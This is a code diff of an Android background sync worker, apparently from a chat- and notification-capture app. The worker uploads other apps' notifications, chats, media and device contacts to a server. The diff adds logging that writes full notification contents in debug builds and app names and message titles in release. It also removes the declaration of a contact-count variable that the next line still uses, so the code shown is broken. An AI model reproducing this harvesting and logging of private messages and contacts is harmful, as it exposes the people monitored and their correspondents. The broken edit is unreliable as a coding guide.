@@ -16,6 +16,7 @@ import android.os.BatteryManager
 import androidx.core.content.ContextCompat
 import com.chats.capture.utils.AppStateManager
 import com.chats.capture.utils.RetryManager
+import com.google.gson.GsonBuilder
 import kotlinx.coroutines.delay
 import timber.log.Timber
 
@@ -23,6 +24,7 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
     
     override suspend fun doWork(): Result {
         return try {
+            Timber.tag("SYNC_WORKER").i("🔄 SyncWorker started - Syncing notifications, chats, and media to server")
             Timber.d("SyncWorker started")
             
             val database = (applicationContext as CaptureApplication).database
@@ -58,10 +60,12 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             captureContactsIfNeeded(contactDao)
             syncContacts(contactDao)
             
+            Timber.tag("SYNC_WORKER").i("✅ SyncWorker completed successfully")
             Timber.d("SyncWorker completed successfully")
             AppStateManager.updateLastSyncTime(applicationContext)
             Result.success()
         } catch (e: Exception) {
+            Timber.tag("SYNC_WORKER").e(e, "❌ SyncWorker failed: ${e.message}")
             Timber.e(e, "SyncWorker failed")
             Result.retry()
         }
@@ -85,8 +89,28 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             val unsyncedNotifications = notificationDao.getUnsyncedNotifications(limit = 50)
             
             if (unsyncedNotifications.isEmpty()) {
+                Timber.tag("SYNC_WORKER").d("📊 No unsynced notifications to sync")
                 Timber.d("No unsynced notifications")
                 return
+            }
+            
+            Timber.tag("SYNC_WORKER").i("🔄 Syncing ${unsyncedNotifications.size} notifications to server...")
+            
+            // Optimized logging - only log summary in release, full data in debug
+            if (com.chats.capture.BuildConfig.DEBUG) {
+                val gson = com.google.gson.Gson()
+                val notificationsJson = gson.toJson(unsyncedNotifications)
+                Timber.tag("API_REQUEST_DATA").d(
+                    "📤 SENDING TO API (${unsyncedNotifications.size} notifications): $notificationsJson"
+                )
+            } else {
+                // In release, just log summary
+                val summary = unsyncedNotifications.map { 
+                    "id=${it.id}, app=${it.appPackage}, title=${it.title?.take(30)}"
+                }.joinToString(" | ")
+                Timber.tag("API_REQUEST_DATA").d(
+                    "📤 SENDING TO API (${unsyncedNotifications.size} notifications): $summary"
+                )
             }
             
             val apiService = ApiClient.getApiService()
@@ -95,11 +119,27 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             if (response.isSuccessful) {
                 try {
                     val responseBody = response.body()
+                    
+                    // Optimized logging - only log in debug builds
+                    if (com.chats.capture.BuildConfig.DEBUG) {
+                        val responseGson = com.google.gson.Gson()
+                        val responseJson = responseGson.toJson(responseBody)
+                        Timber.tag("API_RESPONSE_DATA").d(
+                            "📥 API RESPONSE RECEIVED: $responseJson"
+                        )
+                    } else {
+                        Timber.tag("API_RESPONSE_DATA").d(
+                            "📥 API RESPONSE: success=${responseBody?.success}, message=${responseBody?.message?.take(100)}"
+                        )
+                    }
+                    
                     if (responseBody?.success == true) {
                         // Mark as synced
                         unsyncedNotifications.forEach { notification ->
                             notificationDao.markAsSynced(notification.id)
                         }
+                        Timber.tag("SYNC_WORKER").i("✅ Successfully synced ${unsyncedNotifications.size} notifications to server")
+                        Timber.tag("API_RESPONSE_DATA").i("✅ API confirmed success for ${unsyncedNotifications.size} notifications")
                         Timber.d("Synced ${unsyncedNotifications.size} notifications")
                     } else {
                         // Response was successful but success=false
@@ -136,6 +176,12 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             } else {
                 // HTTP error - try to get error message
                 val errorBody = response.errorBody()?.string()
+                
+                // Log error response from API
+                Timber.tag("API_RESPONSE_DATA").e(
+                    "❌ API ERROR RESPONSE | Status: ${response.code()} | Body: ${errorBody?.take(500) ?: "No error body"}"
+                )
+                
                 val errorMessage = try {
                     if (errorBody != null && errorBody.isNotBlank()) {
                         val gson = com.google.gson.GsonBuilder().setLenient().create()
@@ -156,6 +202,7 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
                         errorMessage
                     )
                 }
+                Timber.tag("SYNC_WORKER").w("Failed to sync notifications: $errorMessage")
                 Timber.w("Failed to sync notifications: $errorMessage")
             }
         } catch (e: com.google.gson.JsonSyntaxException) {
@@ -379,7 +426,7 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
         try {
             // Check if we have READ_CONTACTS permission
             val hasPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
-                android.support.v4.content.ContextCompat.checkSelfPermission(
+                androidx.core.content.ContextCompat.checkSelfPermission(
                     applicationContext,
                     android.Manifest.permission.READ_CONTACTS
                 )
@@ -399,7 +446,6 @@ class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(c
             
             // Only capture if we have very few or no contacts
             // This prevents re-capturing all contacts on every sync
-            val totalContactsCount = contactDao.getTotalCount()
             if (totalContactsCount < 10) {
                 Timber.d("Few contacts in database ($totalContactsCount), capturing contacts from device...")
                 val contactCaptureManager = ContactCaptureManager(applicationContext)
